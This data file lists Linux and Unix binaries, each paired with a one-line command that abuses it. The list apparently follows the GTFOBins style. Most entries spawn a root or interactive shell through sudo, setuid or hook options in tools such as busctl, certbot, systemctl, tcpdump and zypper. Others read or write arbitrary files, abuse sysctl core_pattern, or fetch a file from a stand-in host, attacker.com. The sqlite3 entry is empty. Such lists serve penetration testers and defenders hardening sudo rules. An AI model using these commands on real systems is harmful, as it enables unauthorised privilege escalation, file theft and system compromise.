Name: ansible-playbook
Code: TF=$(mktemp) ; echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF ; sudo ansible-playbook $TF

Name: ar
Code: TF=$(mktemp -u) ; LFILE=file_to_read ; sudo ar r "$TF" "$LFILE" ; cat "$TF"

Name: aria2c
Code: COMMAND='id' ; TF=$(mktemp) ; echo "$COMMAND" > $TF ; chmod +x $TF ; aria2c --on-download-error=$TF http://x

Name: aria2c
Code: COMMAND='id' ; TF=$(mktemp) ; echo "$COMMAND" > $TF ; chmod +x $TF ; sudo aria2c --on-download-error=$TF http://x

Name: busctl
Code: busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

Name: busctl
Code: sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

Name: busctl
Code: ./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'

Name: certbot
Code: TF=$(mktemp -d) ; sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'

Name: clamscan
Code: LFILE=file_to_read ; TF=$(mktemp -d) ; touch $TF/empty.yara ; clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'

Name: clamscan
Code: LFILE=file_to_read ; TF=$(mktemp -d) ; touch $TF/empty.yara ; ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'

Name: clamscan
Code: LFILE=file_to_read ; TF=$(mktemp -d) ; touch $TF/empty.yara ; sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'

Name: composer
Code: TF=$(mktemp -d) ; echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json ; sudo composer --working-dir=$TF run-script x

Name: dmsetup
Code: sudo dmsetup create base <<EOF ; 0 3534848 linear /dev/loop0 94208 ; EOF ; sudo dmsetup ls --exec '/bin/sh -s'

Name: easy_install
Code: TF=$(mktemp -d) ; echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py ; easy_install $TF

Name: easy_install
Code: TF=$(mktemp -d) ; echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py ; sudo easy_install $TF

Name: ed
Code: ed file_to_write ; a ; DATA ; . ; w ; q

Name: ex
Code: ex file_to_write ; a ; DATA ; . ; w ; q

Name: gtester
Code: TF=$(mktemp) ; echo '#!/bin/sh' > $TF ; echo 'exec /bin/sh 0<&1' >> $TF ; chmod +x $TF ; sudo gtester -q $TF

Name: gtester
Code: TF=$(mktemp) ; echo '#!/bin/sh -p' > $TF ; echo 'exec /bin/sh -p 0<&1' >> $TF ; chmod +x $TF ; sudo gtester -q $TF

Name: jjs
Code: echo 'var FileWriter = Java.type("java.io.FileWriter"); ; var fw=new FileWriter("./file_to_write"); ; fw.write("DATA"); ; fw.close();' | jjs

Name: jjs
Code: echo 'var BufferedReader = Java.type("java.io.BufferedReader"); ; var FileReader = Java.type("java.io.FileReader"); ; var br = new BufferedReader(new FileReader("file_to_read")); ; while ((line = br.readLine()) != null) { print(line); }' | jjs

Name: julia
Code: export URL=http://attacker.com/file_to_get ; export LFILE=file_to_save ; julia -e 'download(ENV["URL"], ENV["LFILE"])'

Name: lwp-download
Code: LFILE=file_to_write ; TF=$(mktemp) ; echo DATA >$TF ; lwp-download file://$TF $LFILE

Name: nmap
Code: TF=$(mktemp) ; echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF ; nmap --script=$TF

Name: nmap
Code: TF=$(mktemp) ; echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF ; nmap --script=$TF

Name: nroff
Code: TF=$(mktemp -d) ; echo '#!/bin/sh' > $TF/groff ; echo '/bin/sh' >> $TF/groff ; chmod +x $TF/groff ; GROFF_BIN_PATH=$TF nroff

Name: nroff
Code: TF=$(mktemp -d) ; echo '#!/bin/sh' > $TF/groff ; echo '/bin/sh' >> $TF/groff ; chmod +x $TF/groff ; sudo GROFF_BIN_PATH=$TF nroff

Name: pdb
Code: TF=$(mktemp) ; echo 'import os; os.system("/bin/sh")' > $TF ; pdb $TF ; cont

Name: pdb
Code: TF=$(mktemp) ; echo 'import os; os.system("/bin/sh")' > $TF ; sudo pdb $TF ; cont

Name: php
Code: export CMD="/bin/sh" ; php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'

Name: pic
Code: sudo pic -U ; .PS ; sh X sh X

Name: scp
Code: TF=$(mktemp) ; echo 'sh 0<&2 1>&2' > $TF ; chmod +x "$TF" ; scp -S $TF x y:

Name: sqlite3

Name: sysctl
Code: COMMAND='/bin/sh -c id>/tmp/id' ; sudo sysctl "kernel.core_pattern=|$COMMAND" ; sleep 9999 & ; kill -QUIT $! ; cat /tmp/id

Name: systemctl
Code: TF=$(mktemp).service ; echo '[Service] ; Type=oneshot ; ExecStart=/bin/sh -c "id > /tmp/output" ; [Install] ; WantedBy=multi-user.target' > $TF ; ./systemctl link $TF ; ./systemctl enable --now $TF

Name: systemctl
Code: TF=$(mktemp) ; echo /bin/sh >$TF ; chmod +x $TF ; sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice

Name: systemctl
Code: TF=$(mktemp).service ; echo '[Service] ; Type=oneshot ; ExecStart=/bin/sh -c "id > /tmp/output" ; [Install] ; WantedBy=multi-user.target' > $TF ; sudo systemctl link $TF ; sudo systemctl enable --now $TF

Name: tcpdump
Code: COMMAND='id' ; TF=$(mktemp) ; echo "$COMMAND" > $TF ; chmod +x $TF ; tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF

Name: tcpdump
Code: COMMAND='id' ; TF=$(mktemp) ; echo "$COMMAND" > $TF ; chmod +x $TF ; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

Name: top
Code: echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc ; top ; # press return twice ; reset

Name: virsh
Code: SCRIPT=script_to_run ; TF=$(mktemp) ; cat > $TF << EOF ; <domain type='kvm'> ; <name>x</name> ; <os> ; <type arch='x86_64'>hvm</type> ; </os> ; <memory unit='KiB'>1</memory> ; <devices> ; <interface type='ethernet'> ; <script path='$SCRIPT'/> ; </interface> ; </devices> ; </domain> ; EOF ; sudo virsh -c qemu:///system create $TF ; virsh -c qemu:///system destroy x

Name: zypper
Code: TF=$(mktemp -d) ; cp /bin/sh $TF/zypper-x ; export PATH=$TF:$PATH ; zypper x

Name: zypper
Code: TF=$(mktemp -d) ; cp /bin/sh $TF/zypper-x ; sudo PATH=$TF:$PATH zypper x
